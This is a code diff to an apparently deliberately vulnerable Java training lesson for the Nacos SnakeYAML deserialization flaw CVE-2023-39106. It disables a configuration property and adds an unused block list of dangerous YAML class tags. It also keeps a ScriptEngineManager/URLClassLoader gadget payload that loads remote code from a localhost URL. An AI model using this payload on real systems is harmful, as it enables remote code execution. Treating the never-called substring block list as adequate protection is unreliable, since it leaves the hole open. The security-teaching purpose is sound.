@@ -40,14 +40,14 @@ public class VulnerableNacosSnakeYamlComponentsLesson extends AssignmentEndpoint
   Logger log = LoggerFactory.getLogger(this.getClass().getName());
 
   @PostMapping("/VulnerableNacosSnakeYamlComponents/CVE-2023-39106")
-  public @ResponseBody AttackResult NacosYamlParser(
+    public @ResponseBody AttackResult NacosYamlParser(
       @RequestParam String payload,
       @RequestParam(required = false, defaultValue = "true") Boolean allowComplexObject) {
     // https://security.snyk.io/vuln/SNYK-JAVA-COMALIBABANACOS-5848032
     log.info("VulnerableNacosSnakeYamlComponents#CVE-2023-39106 called with payload : {}", payload);
     try {
 
-      System.setProperty("yamlAllowComplexObject", allowComplexObject.toString());
+      //System.setProperty("yamlAllowComplexObject", allowComplexObject.toString());
       DefaultYamlConfigParse yaml = new DefaultYamlConfigParse();
       Object obj = yaml.parse(payload).get("document");
 
@@ -75,14 +75,31 @@ public class VulnerableNacosSnakeYamlComponentsLesson extends AssignmentEndpoint
         .build();
   }
 
+  private boolean isSafeYamlPayload(String payload) {
+    // Reject payloads containing dangerous class references
+    String[] dangerousPatterns = {
+        "!!javax.script",
+        "!!java.net.URLClassLoader",
+        "!!java.lang.ProcessBuilder",
+        "!!java.beans.XMLDecoder"
+    };
+    
+    for (String pattern : dangerousPatterns) {
+        if (payload.contains(pattern)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+
   public static void main(String[] args) {
     //	String payload="";
     String payload =
-        "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL"
-            + " [\"http://localhost:9000/\"]]]]";
+        "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:9000/\"]]]]"; 
 
     //	payload = "<demo><demo>";
-    System.setProperty("yamlAllowComplexObject", "True");
+    //System.setProperty("yamlAllowComplexObject", "True");
     DefaultYamlConfigParse yamlConfigParse = new DefaultYamlConfigParse();
     Object obj = yamlConfigParse.parse(payload).get("document");
 
